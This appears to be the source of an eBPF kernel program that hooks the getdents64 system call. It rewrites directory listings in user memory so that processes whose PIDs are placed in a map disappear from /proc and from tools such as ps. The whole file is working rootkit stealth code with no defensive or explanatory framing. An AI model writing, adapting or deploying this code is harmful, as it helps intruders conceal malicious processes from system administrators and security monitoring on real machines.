#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

#define MAX_HIDDEN_PIDS 64

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 4096);
    __type(key, __u64);
    __type(value, __u64);
} dirent_bufs SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_HIDDEN_PIDS);
    __type(key, __u32);
    __type(value, __u8);
} hidden_pids SEC(".maps");

SEC("kprobe/sys_getdents64")
int kprobe_getdents64(struct pt_regs *ctx)
{
    __u64 pid_tgid = bpf_get_current_pid_tgid();

    struct pt_regs *inner = (struct pt_regs *)PT_REGS_PARM1(ctx);
    __u64 buf_addr = 0;
    bpf_probe_read_kernel(&buf_addr, sizeof(buf_addr), &inner->si);

    bpf_map_update_elem(&dirent_bufs, &pid_tgid, &buf_addr, BPF_ANY);
    return 0;
}

SEC("kretprobe/sys_getdents64")
int kretprobe_getdents64(struct pt_regs *ctx)
{
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    __u64 *bufp = bpf_map_lookup_elem(&dirent_bufs, &pid_tgid);
    if (!bufp) return 0;
    bpf_map_delete_elem(&dirent_bufs, &pid_tgid);

    int total = (int)PT_REGS_RC(ctx);
    if (total <= 0) return 0;

    __u64 buf = *bufp;
    __u64 offset = 0;
    struct linux_dirent64 *prev = NULL;

    for (int i = 0; i < 512; i++) {
        if (offset >= (__u64)total) break;

        struct linux_dirent64 cur = {};
        if (bpf_probe_read_user(&cur, sizeof(cur), (void *)(buf + offset)) < 0) break;
        if (cur.d_reclen == 0) break;

        char name[16] = {};
        bpf_probe_read_user_str(name, sizeof(name), (void *)(buf + offset + offsetof(struct linux_dirent64, d_name)));

        __u32 pid = 0;
        for (int j = 0; j < 10 && name[j] >= '0' && name[j] <= '9'; j++)
            pid = pid * 10 + (name[j] - '0');

        __u8 *hidden = bpf_map_lookup_elem(&hidden_pids, &pid);
        if (hidden && pid > 0) {
            if (prev) {

                __u16 prev_reclen = 0;
                bpf_probe_read_user(&prev_reclen, sizeof(prev_reclen),
                                    (void *)((char *)prev + offsetof(struct linux_dirent64, d_reclen)));
                prev_reclen += cur.d_reclen;
                bpf_probe_write_user((void *)((char *)prev + offsetof(struct linux_dirent64, d_reclen)),
                                     &prev_reclen, sizeof(prev_reclen));
            }

        } else {
            prev = (struct linux_dirent64 *)(buf + offset);
        }

        offset += cur.d_reclen;
    }

    return 0;
}

char LICENSE[] SEC("license") = "GPL";
